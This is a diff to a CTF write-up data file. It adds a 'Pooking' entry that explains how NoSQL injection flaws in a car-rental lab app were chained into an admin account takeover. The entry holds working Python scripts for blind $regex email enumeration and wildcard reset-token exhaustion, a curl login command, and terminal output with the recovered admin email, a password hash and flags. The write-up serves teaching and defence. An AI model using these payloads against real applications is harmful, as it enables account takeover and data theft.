@@ -8,6 +8,11 @@ export interface MathFormula {
   variant?: 'default' | 'highlight' | 'subtle';
 }
 
+export interface TerminalOutput {
+  command: string;
+  output: string;
+}
+
 export interface WriteUp {
   id: string;
   title: string;
@@ -26,6 +31,7 @@ export interface WriteUp {
     content: string;
     code?: string;
   }[];
+  terminalOutputs?: TerminalOutput[];
   flag: string;
   lessonsLearned: string;
   ctfName: string;
@@ -499,5 +505,67 @@ export const writeups: WriteUp[] = [{
   ],
   "flag": "EPFL{5CR1P71NG_15_CH34T1NG}",
   "lessonsLearned": "Wordle-variant challenges require robust parsing of variable input formats - always extract structure before processing. ANSI color codes are common in terminal-based CTF challenges; regex and character-by-character parsing are essential tools. Dictionary-based solving is effective for word games - preprocessing by length dramatically improves lookup speed. Multi-session challenges can be solved by automating the entire workflow within a loop. Stateless puzzles with limited attempts benefit from greedy/heuristic approaches; perfect optimization isn't always necessary. Terminal output parsing requires careful handling of escape sequences, line breaks, and timing - use robust buffer management (recv_until patterns). Consider word frequency and letter distribution for initial guess selection - starting with common words improves convergence in brute-force approaches."
+
+},
+{
+  "id": "9",
+  "title": "Pooking",
+  "category": "Web",
+  "difficulty": "Medium",
+  "points": 0,
+  "date": "2025-02-24",
+  "author": "CTF Team",
+  "ctfName": "FlagYard",
+  "description": "Premium car rental platform with critical NoSQL injection vulnerabilities. Exploit blind NoSQL injections and token exhaustion to achieve account takeover of admin user and extract the flag.",
+  "problemDescription": "A Node.js/MongoDB-based web application simulating a luxury car rental service. The backend implements custom authentication endpoints with insufficient input validation. Goal: gain unauthorized access to the admin account and retrieve the hidden flag embedded in the API response.",
+  "tools": [
+    "Python 3",
+    "cURL",
+    "Burp Suite",
+    "NoSQL Injection Techniques",
+    "MongoDB Query Manipulation"
+  ],
+  "analysis": "Security analysis reveals four critical vulnerabilities chained together in the API implementation:\n\n**Vulnerability 1: Blind NoSQL Injection on /api/forgot-password** - The endpoint accepts an email parameter that is directly interpolated into MongoDB queries without sanitization. By sending operator objects like {\n  \"email\": {\"$regex\": \"^pattern\"}\n} in the JSON payload, an attacker can perform regex-based queries. Each request returns either 200 OK (match found) or 404 Not Found (no match), creating a timing/response-based oracle. This allows character-by-character enumeration of usernames in the database.\n\n**Vulnerability 2: Insufficient Token Validation on /api/reset-password** - The password reset endpoint accepts a token field in the request body, which is directly used in a MongoDB filter condition without verification. An attacker can send wildcard regex patterns like {\n  \"token\": {\"$regex\": \"^.*\"},\n  \"newPassword\": \"attacker_controlled\"\n} to match ANY token in the database, not just their own.\n\n**Vulnerability 3: Sequential Document Processing Flaw** - MongoDB's findOne() method returns the first matching document in insertion order. When multiple tokens match the wildcard pattern, only the first document is updated. By repeatedly sending requests with the same wildcard token filter, an attacker exhausts tokens of earlier-inserted dummy/decoy accounts until reaching the target admin account.\n\n**Vulnerability 4: Sensitive Data Leakage in API Response** - The web UI does not display the flag or sensitive admin fields, but the backend leaks them directly in the JSON response from /api/login. The flag is embedded in the user object returned after successful authentication, discoverable only through raw HTTP response inspection rather than visual inspection of the web interface.",
+  "solution": [
+    {
+      "title": "Step 1: Reconnaissance & Vulnerability Mapping",
+      "content": "Analyze the web application to identify backend technology (MongoDB via ObjectID format 699c9327...) and API endpoints. Test basic NoSQL operators ($ne, $regex) against different endpoints to determine which is injectable."
+    },
+    {
+      "title": "Step 2: Email Enumeration via Blind NoSQL Injection",
+      "content": "Use the /api/forgot-password endpoint to enumerate admin email character-by-character. Send requests with {\"email\": {\"$regex\": \"^[charset]\"}} payloads. A 200 response indicates the character is present; 404 indicates it's not. Iterate through all possible characters in optimized order (digits first, then letters) to reconstruct the full email address.",
+      "code": "import requests\nimport string\n\nBASE_URL = \"http://target:port/api/forgot-password\"\n\ndef check_email_prefix(prefix):\n    payload = {\"email\": {\"$regex\": f\"^{prefix}\"}}\n    response = requests.post(BASE_URL, json=payload)\n    return response.status_code == 200\n\nemail = \"\"\ncharset = string.digits + string.ascii_lowercase + \".-@\"\n\nfor pos in range(50):  # Max email length\n    for char in charset:\n        test_prefix = email + char\n        if check_email_prefix(test_prefix):\n            email = test_prefix\n            print(f\"[+] Found: {email}\")\n            break\n    else:\n        print(f\"[*] Email completed: {email}\")\n        break"
+    },
+    {
+      "title": "Step 3: Trigger Reset Token Generation",
+      "content": "Once the admin email is identified (e.g., 4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com), trigger the forgot-password mechanism by requesting a password reset token. This causes the backend to generate and store a reset token in the admin's document."
+    },
+    {
+      "title": "Step 4: Token Exhaustion & Password Reset",
+      "content": "Exploit the /api/reset-password endpoint with wildcard token matching. Send multiple requests with {\"token\": {\"$regex\": \"^.*\"}, \"newPassword\": \"HackedPassword123!\"} payload. Each request resets the password of the first user with a matching token. This sequentially burns through dummy account tokens until the admin account is reached, whose password is then forcibly changed to a value under attacker control.",
+      "code": "import requests\nimport time\n\nBASE_URL = \"http://target:port/api/reset-password\"\nADMIN_EMAIL = \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\"\nNEW_PASSWORD = \"HackedPassword123!\"\n\n# Token exhaustion loop\nfor attempt in range(1, 100):\n    payload = {\n        \"token\": {\"$regex\": \"^.*\"},\n        \"newPassword\": NEW_PASSWORD\n    }\n    \n    response = requests.post(BASE_URL, json=payload)\n    print(f\"[*] Attempt {attempt}: {response.status_code}\")\n    \n    if \"success\" in response.json():\n        print(f\"[+] Password reset successful!\")\n        break\n    \n    time.sleep(0.5)  # Small delay to avoid rate limiting"
+    },
+    {
+      "title": "Step 5: Admin Account Takeover & Login",
+      "content": "With the admin password compromised, authenticate to /api/login using the known email and the new password. The backend will return a JSON response containing the admin user object with sensitive data including the hidden flag."
+    },
+    {
+      "title": "Step 6: Flag Extraction",
+      "content": "Examine the raw JSON response from the login endpoint. The flag is embedded in the user object returned by the server, not visible in the web UI. Extract the flag field from the API response.",
+      "code": "curl -s -X POST http://target:port/api/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"email\": \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\",\n    \"password\": \"HackedPassword123!\"\n  }' | jq '.user.flag'\n\n# Output: FlagY{9f4e47684e72251c97a092123b6176c1}"
+    }
+  ],
+  "terminalOutputs": [
+    {
+      "command": "python3 solve.py",
+      "output": "nata@rblx-labs ~/ctf/flagyard/web/14\n % python3 solve.py\n[*] Starting email extraction with digit priority...\nAttempt     5: ✓ '4'\nAttempt    19: ✓ '4d'\nAttempt    42: ✓ '4dm'\nAttempt    44: ✓ '4dm1'\nAttempt    68: ✓ '4dm1n'\nAttempt    70: ✓ '4dm1n1'\nAttempt    76: ✓ '4dm1n15'\nAttempt   106: ✓ '4dm1n15t'\nAttempt   134: ✓ '4dm1n15tr'\nAttempt   139: ✓ '4dm1n15tr4'\nAttempt   169: ✓ '4dm1n15tr4t'\nAttempt   170: ✓ '4dm1n15tr4t0'\nAttempt   198: ✓ '4dm1n15tr4t0r'\nAttempt   235: ✓ '4dm1n15tr4t0r@'\nAttempt   261: ✓ '4dm1n15tr4t0r@p'\nAttempt   262: ✓ '4dm1n15tr4t0r@p0'\nAttempt   263: ✓ '4dm1n15tr4t0r@p00'\nAttempt   284: ✓ '4dm1n15tr4t0r@p00k'\nAttempt   286: ✓ '4dm1n15tr4t0r@p00k1'\nAttempt   310: ✓ '4dm1n15tr4t0r@p00k1n'\nAttempt   327: ✓ '4dm1n15tr4t0r@p00k1ng'\nAttempt   367: ✓ '4dm1n15tr4t0r@p00k1ng.'\nAttempt   383: ✓ '4dm1n15tr4t0r@p00k1ng.f'\nAttempt   405: ✓ '4dm1n15tr4t0r@p00k1ng.fl'\nAttempt   410: ✓ '4dm1n15tr4t0r@p00k1ng.fl4'\nAttempt   427: ✓ '4dm1n15tr4t0r@p00k1ng.fl4g'\nAttempt   462: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy'\nAttempt   467: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4'\nAttempt   495: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4r'\nAttempt   509: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd'\nAttempt   549: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd.'\nAttempt   562: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd.c'\nAttempt   587: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd.co'\nAttempt   610: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com'\n✓ VERIFIED: 4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\nAttempt    852: trying '4dmy'^C\n\nInterrupted by user.\n\nCurrent collected emails (1 total):\n- 4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com"
+    },
+    {
+      "command": "curl -s -X POST http://target/api/login -H 'Content-Type: application/json' -d '{\"email\": \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\", \"password\": \"HackedPassword123!\"}'",
+      "output": "{\n  \"success\": true,\n  \"message\": \"Login successful\",\n  \"user\": {\n    \"_id\": \"699c9327e39607aefcd8dbe8\",\n    \"email\": \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\",\n    \"password\": \"$2b$10$ggX4rt5vlqXhH5BpuZVOoOlK5Ct16WvDo5q5jTqZuNIW3b5x/QZb2\",\n    \"fullName\": \"Senior Administrator\",\n    \"phone\": \"+966501234570\",\n    \"role\": \"senior_admin\",\n    \"isActive\": true,\n    \"flag\": \"FlagY{9f4e47684e72251c97a092123b6176c1}\",\n    \"department\": \"IT Security\",\n    \"accessLevel\": \"Level 5\",\n    \"createdAt\": \"2023-01-01T00:00:00.000Z\",\n    \"lastLogin\": \"2026-02-23T19:05:01.319Z\"\n  }\n}"
+    }
+  ],
+  "flag": "FlagY{9f4e47684e72251c97a092123b6176c1}",
+  "lessonsLearned": "Never trust user input in database queries - always use parameterized queries and proper input validation. NoSQL operators like $regex must be explicitly blocked in user-controlled parameters. Password reset mechanisms are critical security components; implement proper token validation (time-limited, single-use, cryptographically random). Query results should not rely on insertion order for security decisions; always use explicit accountability mechanisms. Sensitive data should never be exposed in API responses, even to authenticated users without explicit authorization. Implement rate limiting on authentication endpoints to prevent token exhaustion attacks. Use defense-in-depth: combine input validation, proper query construction, and response sanitization to prevent information disclosure."
 
 }];
